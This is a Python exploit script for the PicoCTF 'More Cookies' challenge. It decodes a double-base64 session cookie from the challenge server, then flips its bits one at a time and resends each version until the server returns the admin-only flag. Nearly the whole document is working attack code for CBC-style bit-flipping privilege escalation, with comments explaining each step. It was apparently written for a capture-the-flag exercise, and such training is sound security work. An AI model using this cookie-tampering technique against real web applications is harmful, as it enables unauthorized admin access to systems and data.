# PicoCTF - More Cookies
# This script performs a bit-flipping attack on a double-base64-encoded cookie to escalate privileges.
#TL;DR:
#This is a bit-flipping attack on an encoded cookie to escalate to admin and leak the flag. You're flipping one bit at a time, re-encoding the cookie, and watching for the magic string picoCTF{.
# Payload construct the current guess.
# - All bytes before the current `position_idx` are left alone.
# - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
#   This is done by XORing the byte with another byte where all bits are zero
#   except for the bit in position `bit_idx`. The code `1 << bit_idx`
#   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
#   the XOR operation will flip the bit in position `bit_idx`.
# - All bytes after the current `position_idx` are left alone.


import requests
import base64

# Target web application URL
url = "http://mercury.picoctf.net:43275/"

# Create a session to persist cookies
s = requests.Session()
s.get(url)  # Initial GET request to receive the cookie

# Extract the "auth_name" cookie from the response
cookie = s.cookies["auth_name"]

# The cookie is base64-encoded twice. Decode it twice to get the raw bytes.
decoded_cookie = base64.b64decode(cookie)
raw_cookie = base64.b64decode(decoded_cookie)

def exploit():
    print("[*] Looking for admin cookie...")

    # Iterate through each byte in the decoded cookie
    for position_idx in range(0, len(raw_cookie)):
        # Flip each bit (0-7) in the current byte
        for bit_idx in range(0, 8):
            # Construct a modified copy of the cookie with one bit flipped
            bitflip_guess = (
                raw_cookie[0:position_idx] +  # unchanged part before the target byte
                ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big")) +  # flip one bit
                raw_cookie[position_idx + 1 :]  # unchanged part after the target byte
            )

            # Double-base64 encode the modified cookie to match the original format
            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()

            # Send the tampered cookie back to the server
            r = requests.get(url, cookies={"auth_name": guess})

            # Check if the response contains the flag
            if "picoCTF{" in r.text:
                print(f"Admin bit found in byte {position_idx} bit {bit_idx}.")
                # Extract and print the flag from the HTML
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return

# Run the exploit
exploit()

